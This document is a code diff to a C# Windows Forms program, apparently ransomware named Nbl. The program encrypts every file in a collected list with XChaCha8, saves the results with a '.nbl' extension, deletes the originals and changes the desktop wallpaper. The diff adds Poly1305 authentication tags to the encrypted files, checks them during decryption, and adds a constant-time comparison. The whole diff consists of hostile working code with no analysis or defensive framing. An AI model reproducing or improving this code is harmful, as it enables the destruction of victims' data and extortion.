@@ -1,4 +1,3 @@
-//test
 using System;
 using System.Collections.Generic;
 using System.ComponentModel;
@@ -456,9 +455,15 @@ public class Nbl : Form
                 {
                         KeyHash = sha.ComputeHash(key);
                 }
-                string hashHex = BitConverter.ToString(KeyHash).Replace("-", "").ToLowerInvariant();
-                KeyHashes.Add(hashHex);
-                SaveKeyHashes();
+		string hashHex = BitConverter.ToString(KeyHash).Replace("-", "").ToLowerInvariant();
+		KeyHashes.Add(hashHex);
+		SaveKeyHashes();
+
+		byte[] polyKey;
+		using (SHA256 sha = SHA256.Create())
+		{
+			polyKey = sha.ComputeHash(key);
+		}
 
                 /*
                 try
@@ -488,12 +493,12 @@ public class Nbl : Form
 
                 Parallel.ForEach(allFiles, new ParallelOptions { MaxDegreeOfParallelism = Environment.ProcessorCount * 2 }, filePath =>
                         {
-                                EncryptFile(filePath, key, nonce, KeyHash);
+				EncryptFile(filePath, key, nonce, KeyHash, polyKey);
                         });
                 SetWallpaper();
         }
 
-        private static void EncryptFile(string filePath, byte[] key, byte[] nonce, byte[] keyHash)
+	private static void EncryptFile(string filePath, byte[] key, byte[] nonce, byte[] keyHash, byte[] polyKey)
         {
                 try
                 {
@@ -516,14 +521,18 @@ public class Nbl : Form
                                 }
                         }
 
-                        byte[] ciphertext = new byte[plaintext.Length];
-                        XChaCha8.Crypt(key, nonce, plaintext, ciphertext);
+		byte[] ciphertext = new byte[plaintext.Length];
+		XChaCha8.Crypt(key, nonce, plaintext, ciphertext);
 
-                        using (FileStream fsOut = new FileStream(filePath + ".nbl", FileMode.Create, FileAccess.Write, FileShare.None, 65536, FileOptions.WriteThrough))
-                        {
-                                fsOut.Write(keyHash, 0, keyHash.Length);
-                                fsOut.Write(ciphertext, 0, ciphertext.Length);
-                        }
+		byte[] tag = new byte[16];
+		Poly1305.Mac(polyKey, ciphertext, ciphertext.Length, tag);
+
+		using (FileStream fsOut = new FileStream(filePath + ".nbl", FileMode.Create, FileAccess.Write, FileShare.None, 65536, FileOptions.WriteThrough))
+		{
+			fsOut.Write(keyHash, 0, keyHash.Length);
+			fsOut.Write(tag, 0, tag.Length);
+			fsOut.Write(ciphertext, 0, ciphertext.Length);
+		}
                         File.Delete(filePath);
                 }
                 catch
@@ -679,24 +688,37 @@ public class Nbl : Form
                                 }
                         }
 
-                        if (fileData.Length < 32) return false;
+		if (fileData.Length < 48) return false;
 
-                        byte[] storedHash = new byte[32];
-                        Buffer.BlockCopy(fileData, 0, storedHash, 0, 32);
+			byte[] storedHash = new byte[32];
+			Buffer.BlockCopy(fileData, 0, storedHash, 0, 32);
 
-                        using (SHA256 sha = SHA256.Create())
-                        {
-                                byte[] computedHash = sha.ComputeHash(key);
-                                for (int i = 0; i < 32; i++)
-                                {
-                                        if (storedHash[i] != computedHash[i]) return false;
-                                }
-                        }
+			using (SHA256 sha = SHA256.Create())
+			{
+				byte[] computedHash = sha.ComputeHash(key);
+				for (int i = 0; i < 32; i++)
+				{
+					if (storedHash[i] != computedHash[i]) return false;
+				}
+			}
 
-                        byte[] ciphertext = new byte[fileData.Length - 32];
-                        Buffer.BlockCopy(fileData, 32, ciphertext, 0, ciphertext.Length);
+			byte[] storedTag = new byte[16];
+			Buffer.BlockCopy(fileData, 32, storedTag, 0, 16);
 
-                        byte[] nonce = DeriveNonceFromKey(key);
+			byte[] ciphertext = new byte[fileData.Length - 48];
+			Buffer.BlockCopy(fileData, 48, ciphertext, 0, ciphertext.Length);
+
+			byte[] polyKey;
+			using (SHA256 sha = SHA256.Create())
+			{
+				polyKey = sha.ComputeHash(key);
+			}
+			byte[] computedTag = new byte[16];
+			Poly1305.Mac(polyKey, ciphertext, ciphertext.Length, computedTag);
+
+			if (!ConstantTimeEquals(storedTag, computedTag)) return false;
+
+			byte[] nonce = DeriveNonceFromKey(key);
                         byte[] plaintext = new byte[ciphertext.Length];
                         XChaCha8.Crypt(key, nonce, ciphertext, plaintext);
 
@@ -712,6 +734,15 @@ public class Nbl : Form
                 {
                         return false;
                 }
+        }
+
+        private static bool ConstantTimeEquals(byte[] a, byte[] b)
+        {
+                if (a == null || b == null || a.Length != b.Length) return false;
+                int diff = 0;
+                for (int i = 0; i < a.Length; i++)
+                        diff |= a[i] ^ b[i];
+                return diff == 0;
         }
 
         private void Nbl_Load(object sender, EventArgs e)
